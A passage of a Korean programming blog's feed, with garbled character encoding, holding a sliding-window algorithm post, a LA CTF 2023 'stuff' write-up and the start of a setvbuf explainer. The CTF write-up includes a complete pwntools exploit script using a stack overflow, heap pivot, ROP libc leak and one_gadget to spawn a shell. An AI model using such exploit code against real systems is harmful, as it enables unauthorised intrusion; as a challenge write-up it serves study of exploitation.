ÏïåÍ≥†Î¶¨Ï¶òÏùÑ Ïù¥Ïö©ÌïúÎã§. leftÏôÄ right Î≥ÄÏàòÎ•º ÌïòÎÇòÏî© ÎëêÍ≥† Ï°∞Í±¥Ïóê Îî∞Îùº Îëò Ï§ë ÌïòÎÇòÏùò Ìè¨Ïù∏ÌÑ∞Î•º Ïù¥ÎèôÏãúÏºú Í∑∏ Í∞íÏùÑ ÎçîÌïòÍ±∞ÎÇò Î∫ÄÎã§. Ï§ëÏöîÌïú Í≤ÉÏùÄ leftÎäî Ìï≠ÏÉÅ rightÏùò ÏôºÏ™ΩÏóê ÏúÑÏπòÌïòÍ≥†, rightÎäî Ï†ïÏàòÏùò ÌÅ¨Í∏∞ Ï¶â, nÎ≥¥Îã§ ÏûëÏïÑÏïº ÌïúÎã§.</p><p>Ïó∞ÏÜçÎêú Í∞íÏù¥ mÏù¥ ÎêòÎäî Í≤ΩÏö∞Ïùò ÏàòÎ•º Íµ¨ÌïòÎäî Í≤ÉÏù¥Í∏∞ ÎïåÎ¨∏Ïóê Ï°∞Í±¥ÏùÄ sumÏù¥ mÎ≥¥Îã§ ÌÅ∞Í∞Ä, ÏûëÏùÄÍ∞Ä, Í∞ôÏùÄÍ∞ÄÎ°ú ÎÇòÎàå Ïàò ÏûàÎã§. ÎßåÏïΩ sumÏù¥ mÎ≥¥Îã§ ÌÅ¨Îã§Î©¥ leftÎ•º Ïò§Î•∏Ï™ΩÏúºÎ°ú Ìïú Ïπ∏ Ïù¥ÎèôÏãúÏºú leftÍ∞Ä Í∞ÄÎ¶¨ÌÇ§Îäî Í∞íÏùÑ sumÏóêÏÑú Î∫ÄÎã§. ÎßåÏïΩ sumÏù¥ mÎ≥¥Îã§ ÏûëÎã§Î©¥ rightÎ•º Ïò§Î•∏Ï™ΩÏúºÎ°ú Ìïú Ïπ∏ Ïù¥ÎèôÏãúÏºú rightÍ∞Ä Í∞ÄÎ¶¨ÌÇ§Îäî Í∞íÏùÑ sumÏóê ÎçîÌïúÎã§. sumÍ≥º mÏù¥ Í∞ôÎã§Î©¥ cntÎ•º Ï¶ùÍ∞ÄÏãúÏºúÏ£ºÍ≥† rightÎ•º Ïò§Î•∏Ï™ΩÏúºÎ°ú Ìïú Ïπ∏ Ïù¥ÎèôÏãúÌÇ§Í≥† Îã§Î•∏ Í≤ΩÏö∞Ïùò ÏàòÎ•º Ï∞æÎäîÎã§.</p><h2 id="Î∞±Ï§Ä-ÏàòÏó¥-Ïã§Î≤Ñ3"><a href="#Î∞±Ï§Ä-ÏàòÏó¥-Ïã§Î≤Ñ3" class="headerlink" title="Î∞±Ï§Ä - ÏàòÏó¥ (Ïã§Î≤Ñ3)"></a>Î∞±Ï§Ä - ÏàòÏó¥ (Ïã§Î≤Ñ3)</h2><ul><li><a href="https://www.acmicpc.net/problem/2559">https://www.acmicpc.net/problem/2559</a></li><li>nÍ∞ú Ï†ïÏàòÏùò ÏàòÏó¥Ïù¥ Ï£ºÏñ¥Ï°åÏùÑ Îïå, Ïó∞ÏÜçÏ†ÅÏù∏ kÍ∞úÏùò Í∞íÏùò Ìï©Ïù¥ Í∞ÄÏû• ÌÅ∞ Í∞íÏùÑ Í≥ÑÏÇ∞<ul><li>ÏûÖÎ†•  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10 2</span><br><span class="line">3 -2 -4 -9 0 3 7 13 8 -3</span><br></pre></td></tr></table></figure></li><li>Ï∂úÎ†•  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21</span><br></pre></td></tr></table></figure></li></ul></li><li>C ÏΩîÎìú<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n,k;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">        sum += arr[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    max = sum;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = k; i &lt; n; i++) &#123;</span><br><span class="line">        sum += arr[i];</span><br><span class="line">        sum -= arr[i-k];</span><br><span class="line">        <span class="keyword">if</span> (sum &gt; max) &#123;</span><br><span class="line">            max = sum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, max);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>ÏïûÏùò Î¨∏Ï†úÏôÄ Îã§Î•¥Í≤å Ìï©Ïù¥ mÏù¥ ÎêòÎäî Í≤ΩÏö∞Ïùò ÏàòÎ•º Íµ¨ÌïòÎäî Í≤ÉÏù¥ ÏïÑÎãå, kÍ∞úÏùò Ïó∞ÏÜçÎêú Í∞íÏùò Ìï©Ïù¥ Í∞ÄÏû• ÌÅ∞ Í∞íÏùÑ Í≥ÑÏÇ∞Ìï¥Ïïº ÌïúÎã§. ÏïûÏùò Î¨∏Ï†úÎäî Ïó∞ÏÜçÎêú Í∞íÏù¥ ÏàòÎ•º ÏòàÏ∏°Ìï† Ïàò ÏóÜÍ∏∞ ÎïåÎ¨∏Ïóê leftÏôÄ rightÎ•º ÎèÖÎ¶ΩÏ†ÅÏúºÎ°ú Í≥ÑÏÇ∞ÌñàÏßÄÎßå Ïù¥ Î¨∏Ï†úÎäî Ïó∞ÏÜçÎêú Í∞íÏùò ÏàòÎ•º Ïïå Ïàò ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê Íµ≥Ïù¥ Í∑∏Îü¨ÏßÄ ÏïäÏïÑÎèÑ ÎêúÎã§. iÏôÄ i-k Î≤àÏß∏ Ïù∏Îç±Ïä§(Ìà¨ Ìè¨Ïù∏ÌÑ∞ ÏïåÍ≥†Î¶¨Ï¶òÏóêÏÑú Ìè¨Ïù∏ÌÑ∞Ïùò Í∞úÎÖê)Î°ú leftÏôÄ rightÎ•º ÎåÄÏ≤¥Ìï† Ïàò ÏûàÎã§.</p><p>Ï≤òÏùåÏóê arr[0] ~ arr[k-1]Ïùò Ìï©ÏùÑ Íµ¨Ìï¥Ï£ºÍ≥† maxÎ°ú Ï†ÄÏû•ÌïúÎã§. Ïù¥ Í∞íÏù¥ Í∏∞Ï§ÄÏ†êÏù¥ Îê† Í≤ÉÏù¥Í≥†, Ïù¥ Í∞íÎ≥¥Îã§ ÌÅ∞ Í≤ΩÏö∞ ÏÉàÎ°úÏö¥ Í∞íÏùÑ maxÎ°ú ÏßÄÏ†ïÌï† Í≤ÉÏù¥Îã§. arr[k]ÏóêÏÑú arr[n-1]Î°ú Î∞òÎ≥µÏù¥ ÏßÑÌñâÎê† ÎèôÏïà arr<a href="right">i</a>Î•º sumÏóê ÎçîÌïòÍ≥† arr<a href="left">i-k</a>Î•º sumÏóêÏÑú ÎπºÏ§ÄÎã§. Ìï¥Îãπ Î∞òÎ≥µÏù¥ ÎÅùÎÇòÎ©¥ Î¨∏Ï†úÏóêÏÑú ÏöîÍµ¨ÌïòÎäî maxÎ•º Íµ¨Ìï† Ïàò ÏûàÎã§.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Baekjoon </tag>
            
            <tag> two-pointers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - stuff (setvbuf)</title>
      <link href="/230303-lactf2023-stuff/"/>
      <url>/230303-lactf2023-stuff/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>Jason keeps bullying me for using Fedora so here‚Äôs a binary compiled on Fedora.<br><code>nc lac.tf 31182</code></p></blockquote><ul><li>[7 solves &#x2F; 497 points]</li></ul><p>ÏÉàÎ°úÏö¥ Í≤ÉÏùÑ ÎßéÏù¥ Î∞∞Ïö¥ Î¨∏Ï†úÏù¥Îã§.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Î∂ÑÏÑùÌïòÍ∏∞Ïóê ÏïûÏÑú <code>patchelf</code>Î•º Ïù¥Ïö©ÌïòÏó¨ Ïó¥Ïã¨Ìûà Ìå®ÏπòÎ•º ÏßÑÌñâÌñàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch stuff]$ ldd stuff-p</span><br><span class="line">linux-vdso.so.1 (0x00007ffdd2f16000)</span><br><span class="line">./libstdc++.so.6 (0x00007f32ef600000)</span><br><span class="line">./libm.so.6 (0x00007f32ef86a000)</span><br><span class="line">./libgcc_s.so.1 (0x00007f32ef84a000)</span><br><span class="line">./libc.so.6 (0x00007f32ef423000)</span><br><span class="line">./ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f32ef94c000)</span><br></pre></td></tr></table></figure><p>Ïù¥Ï†ú IDAÎ•º Ïù¥Ïö©Ìï¥ÏÑú ÏΩîÎìúÎ•º Î∂ÑÏÑùÌï¥Î≥¥Ïûê.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> ptr[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;menu:&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;1. leak&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;2. do stuff&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6) != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;oops&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;here&#x27;s your leak: %p\n&quot;</span>, v4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 != <span class="number">2</span> );</span><br><span class="line">  fread(ptr, <span class="number">1uLL</span>, <span class="number">0x20</span>uLL, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Îëê Í∞ÄÏßÄÏùò Í∏∞Îä•Ïù¥ ÏûàÎã§. heap Ï£ºÏÜåÎ•º Ï∂úÎ†•Ìï¥Ï£ºÎäî Í∏∞Îä•Í≥º <code>fread</code> Ìï®ÏàòÎ•º Ïù¥Ïö©Ìï¥ÏÑú <code>char ptr[12]</code>Ïóê 0x20ÎßåÌÅº Ïì∏ Ïàò ÏûàÎã§. Ïó¨Í∏∞ÏóêÏÑú overflowÎ•º Î∞úÏÉùÏãúÌÇ¨ Ïàò ÏûàÍ≥† retÎ•º ÎçÆÏñ¥ ripÎ•º Ï°∞Ï†àÌï† Ïàò ÏûàÎã§.</p><p>Ïó¨Í∏∞ÏÑú Ï§ëÏöîÌïú Ï†êÏùÄ <code>setvbuf</code>Î•º Ïù¥Ïö©ÌïòÏó¨ <code>stdin</code>ÏùÑ ÏÇ¨Ïö©Ìï† Îïå Î≤ÑÌçºÎßÅÏùÑ Ïù¥Ïö©ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê ÌûôÏóê ÎÇ¥Í∞Ä ÏûÖÎ†•Ìïú Í∞íÎì§Ïù¥ Ï†ÄÏû•ÎêúÎã§. Ïù¥Í≤ÉÏùÄ Ìûô Ï£ºÏÜåÏóê ÌéòÏù¥Î°úÎìúÎ•º Ï†ÄÏû•ÏãúÌÇ¨ Ïàò ÏûàÎã§Îäî Í≤ÉÏùÑ ÏùòÎØ∏ÌïúÎã§.</p><ul><li><a href="https://jiravvit.github.io/230223-pwn-setvbuf/">https://jiravvit.github.io/230223-pwn-setvbuf/</a></li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>scanf</code>Î°ú Ïà´Ïûê Îç∞Ïù¥ÌÑ∞Î•º ÌïòÎÇò Î≥¥ÎÇº Îïå, Îí§Ïóê Îã§Î•∏ Í∞íÎì§ÏùÑ ÎçßÎ∂ôÏù¥Î©¥ Ïù¥ Îç∞Ïù¥ÌÑ∞Îì§ÏùÄ Ìûô Î≤ÑÌçºÏóê Ï†ÄÏû•ÎêòÍ≥†, Îã§Ïùå ÏûÖÎ†• Îïå ÏÇ¨Ïö©ÏûêÏùò ÌÇ§Î≥¥ÎìúÎ°úÎ∂ÄÌÑ∞ ÏûÖÎ†•ÏùÑ Î∞õÏßÄ ÏïäÍ≥† Ïù¥ Ìûô Î≤ÑÌçºÏóê Ï†ÄÏû•Îêú Í∞íÏùÑ Î∞îÎ°ú ÏûÖÎ†•ÏúºÎ°ú ÎÑ£Ïñ¥Ï§Ñ Ïàò ÏûàÎã§. </p><ol><li><p>Ï£ºÏñ¥ÏßÑ Í∏∞Îä•ÏùÑ Ïù¥Ïö©Ìï¥ Ìûô Ï£ºÏÜåÎ•º leakÌïúÎã§. </p></li><li><p>2Î≤à Í∏∞Îä•ÏùÑ Ïù¥Ïö©ÌïòÍ∏∞ ÏúÑÌï¥ 2Î•º ÏÑúÎ≤ÑÎ°ú Ï†ÑÏÜ°ÌïòÎäîÎç∞, Îí§Ïóê ROP ÌéòÏù¥Î°úÎìúÎ•º ÎçßÎ∂ôÏó¨ÏÑú Ìïú Î≤àÏóê Ï†ÑÏÜ°ÌïúÎã§. Ï∞∏Í≥†Î°ú Ïù¥ ROP ÌéòÏù¥Î°úÎìúÎäî 2Î≤à Í∏∞Îä•Ïùò <code>fread</code> Ìï®ÏàòÍ∞Ä Ï¢ÖÎ£åÎêú Îí§, mainÏù¥ ÎÅùÎÇòÍ≥† <code>leave ret</code>ÏùÑ Ìïú Î≤à Îçî ÏàòÌñâÌïòÏó¨ rbpÏôÄ rspÎ•º heapÏ£ºÏÜåÎ°ú ÎßåÎì§Ïñ¥Ï§ÄÎã§. Í∑∏ heap Ï£ºÏÜåÎäî ROP ÌéòÏù¥Î°úÎìúÍ∞Ä Ï†ÄÏû•Îêú Í≥≥Ïù¥Í≥† <code>fread</code> Í∞ÄÏ†ØÏùÑ Î∞∞ÏπòÌïòÏó¨ Î∞îÎ°ú Ìïú Î≤à Îçî Ïã§ÌñâÌïòÍ≤å ÌïúÎã§. Ïù¥ Îïå, Îëê Î≤àÏß∏ ÌéòÏù¥Î°úÎìúÎ•º ÏûÖÎ†•ÏúºÎ°ú Î∞õÎäîÎç∞, Ïù¥Í≤ÉÏùò Ïó≠Ìï†ÏùÄ <code>printf</code> Ìï®ÏàòÎ•º Ïã§ÌñâÌïòÎèÑÎ°ù ÌïòÎäî Í≤ÉÏù¥Îã§. <code>fread</code> Ìï®ÏàòÍ∞Ä Ï¢ÖÎ£åÎêòÍ≥† <code>printf();</code>Í∞Ä Ïã§ÌñâÎêòÎäîÎç∞ NULL pointerÎ•º Ï∂úÎ†•ÌïòÍ≤å ÎêòÎ©¥ ÏïÑÎ¨¥Í≤ÉÎèÑ Ï∂úÎ†•ÌïòÏßÄ ÏïäÎäîÎã§. Ï§ëÏöîÌïú Í≤ÉÏùÄ <code>printf</code> Ìï®ÏàòÍ∞Ä Ï¢ÖÎ£åÎêòÍ≥† <code>rsi</code>Ïóê <code>libc</code> Ï£ºÏÜåÍ∞Ä Îì§Ïñ¥Í∞ÄÎäî Í≤ÉÏù¥Îã§. Í∑∏ Îã§Ïùå <code>0x4011f6</code> Ï£ºÏÜåÍ∞Ä Ïã§ÌñâÎêòÎäîÎç∞ Ïù¥Îäî <code>rsi</code> Î†àÏßÄÏä§ÌÑ∞Î•º Ï∂úÎ†•ÌïòÎØÄÎ°ú ÏµúÏ¢ÖÏ†ÅÏúºÎ°ú <code>libc</code> Ï£ºÏÜåÎ•º Ï∂úÎ†•Ìï† Ïàò ÏûàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011F6 mov     edi, offset format ; &quot;here&#x27;s your leak: %p\n&quot;</span><br><span class="line">.text:00000000004011FB mov     eax, 0</span><br><span class="line">.text:0000000000401200 call    _printf</span><br></pre></td></tr></table></figure><p>Ïù¥ ÏûëÏóÖÏù¥ ÎÅùÎÇòÎ©¥ mainÏùò <code>while(1)</code> Î£®ÌîÑ ÎÇ¥Î∂ÄÏù¥ÎØÄÎ°ú mainÏùò Í∏∞Îä•ÏùÑ Ï∂îÍ∞ÄÏ†ÅÏúºÎ°ú Îçî Ïã§ÌñâÌï† Ïàò ÏûàÎã§.</p></li><li><p>ÌôîÎ©¥Ïóê leakÎêú libc Ï£ºÏÜåÎ•º Í∞ÄÏ†∏ÏôÄ libc baseÎ•º Íµ¨ÌïúÎã§.</p></li><li><p>ÏõêÍ∞ÄÏ†ØÏùÑ Ïù¥Ïö©ÌïòÏó¨ ÏâòÏùÑ ÌöçÎìùÌïúÎã§. 2Î≤à Î©îÎâ¥Î•º Ïù¥Ïö©ÌïòÏó¨ ripÎ•º Ï°∞ÏûëÌï† Ïàò ÏûàÎã§. Ï°∞Í±¥ÏùÄ ÏïÑÎûòÏôÄ Í∞ôÏúºÎØÄÎ°ú Î†àÏßÄÏä§ÌÑ∞ ÏÉÅÌô©ÏùÑ ÏÇ¥Ìé¥Î≥¥Í≥† Ï†ÅÎãπÌïú Í∞ÄÏ†ØÏùÑ Ï∞æÏïÑ Í∞íÏùÑ Î∞îÍøîÏ§ÄÎã§. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x4d1a0 posix_spawn(rsp+0xc, &quot;/bin/sh&quot;, 0, rbx, rsp+0x50, environ) </span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line">  rbx == NULL || (u16)[rbx] == NULL</span><br></pre></td></tr></table></figure></li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./stuff-p&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;lac.tf&#x27;, 31182)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./stuff-p&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x401234</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (1) leak the heap</span></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;stuff\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;heap: &#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (2)</span></span><br><span class="line">payload = <span class="string">b&#x27;2&#x27;</span>.rjust(<span class="number">8</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment"># heap pivoting</span></span><br><span class="line"><span class="comment"># fread(ptr, 1uLL, 0x20uLL, stdin);</span></span><br><span class="line">payload += p64(heap)</span><br><span class="line">payload += p64(<span class="number">0x40120f</span>) <span class="comment"># fread gadget</span></span><br><span class="line">payload += p64(heap-<span class="number">0x1008</span>)</span><br><span class="line">payload += p64(leave_ret) <span class="comment"># 0x20</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;stuff\n&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># p.send(p64(heap-0x1008) * 2 + p64(e.plt[&#x27;printf&#x27;]) + p64(0x4011f6))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;BBBBBBBB&#x27;</span></span><br><span class="line">payload += p64(e.plt[<span class="string">&#x27;printf&#x27;</span>]) <span class="comment"># fread -&gt; printf :: set rsi to libc</span></span><br><span class="line">payload += p64(<span class="number">0x4011f6</span>) <span class="comment"># print libc</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (3)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;leak: &#x27;</span>+ <span class="built_in">hex</span>(leak))</span><br><span class="line">libc.address = leak - <span class="number">0x1d5a40</span></span><br><span class="line">info(<span class="string">&#x27;libc.address: &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># (4)</span></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4d1a0</span></span><br><span class="line">pop_rbx = libc.address + <span class="number">0x0000000000031f61</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;2&#x27;</span>.rjust(<span class="number">8</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(pop_rbx) + p64(<span class="number">0</span>) + p64(one_gadget)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;stuff\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
        <tags>
            
            <tag> setvbuf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - setvbuf</title>
      <link href="/230223-pwn-setvbuf/"/>
      <url>/230223-pwn-setvbuf/</url>
      
        <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>ÏñºÎßà Ï†Ñ Î¨∏Ï†úÎ•º ÌíÄÎã§Í∞Ä Ï≤òÏùå Î≥¥Îäî Í∞úÎÖêÏù¥ ÎÇòÏôÄÏÑú Ï†ïÎ¶¨Ìï¥Î≥¥Î†§Í≥† ÌïúÎã§. <code>scanf(&quot;%d&quot;, &amp;n)</code>ÏúºÎ°ú intÌòï Í∞íÏùÑ ÏûÖÎ†•Î∞õÎäîÎç∞ Ïù¥ÏÉÅÌïòÍ≤å Ïò§Î≤ÑÌîåÎ°úÏö∞(?)Í∞Ä Î∞úÏÉùÌïòÏßÄÎèÑ ÏïäÎäîÎç∞ Îç∞Ïù¥ÌÑ∞Í∞Ä heapÏóê Ï†ÄÏû•ÎêòÎäî Í≤ÉÏù¥Îã§. write upÏùÑ ÏÇ¥Ìé¥Î¥êÎèÑ ÏùµÏä§ ÏΩîÎìúÎßå ÏûàÍ≥† heapÏóê paylaodÎ•º pivotÌïúÎã§Îäî ÏãùÎßå Ï£ºÏÑùÏúºÎ°ú Í∞ÑÎã®ÌïòÍ≤å Ï†ÅÌòÄÏûàÏñ¥ÏÑú Ïôú heapÏóê payloadÍ∞Ä Ï†ÄÏû•ÎêòÎäîÏßÄ Ïù¥Ìï¥ÌïòÍ∏∞Í∞Ä ÌûòÎì§ÏóàÎã§. Ïù¥Ïóê ÎåÄÌï¥ Í∞ÑÎã®ÌïòÍ≤å ÏïåÏïÑÎ≥¥Ïûê.</p><p>Í≤∞Î°†ÏùÑ ÎßêÌïòÎ©¥ <code>setvbuf</code> Ìï®Ïàò ÎïåÎ¨∏Ïù¥ÏóàÎã§.</p><h2 id="setvbuf"><a href="#setvbuf" class="headerlink" title="setvbuf"></a><code>setvbuf</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">int setvbuf(FILE* stream, char* buffer, int mode, size_t size);</span><br></pre></td></tr></table></figure><p>Ïä§Ìä∏Î¶º Î≤ÑÌçº Î∞©ÏãùÏùÑ Î≥ÄÍ≤ΩÌïúÎã§. <code>Î≤ÑÌçºÎßÅ</code>ÏùÄ 